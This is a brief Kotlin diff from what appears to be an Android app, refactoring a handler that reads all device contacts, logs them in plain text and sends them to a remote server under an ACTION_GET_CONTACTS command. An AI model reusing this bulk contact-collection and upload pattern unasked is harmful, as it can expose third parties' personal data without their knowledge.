@@ -13,10 +13,11 @@ open class GetContactsHandler(
     open fun handle() {
         val contactsList = getAllContacts(context.contentResolver)
         val contactsString = contactsList.joinToString(",")
-        val contactsPayload = mapOf("contacts" to contactsString)
+        val contactsPayload = mapOf(Actions.ACTION_GET_CONTACTS.name to contactsString)
         Log.i("contacts list", "handle: $contactsString")
         if (contactsList.isNotEmpty()) {
-            sendToServer(
+            sendTo(
+                context = context,
                 Actions.ACTION_GET_CONTACTS,
                 contactsPayload,
             )
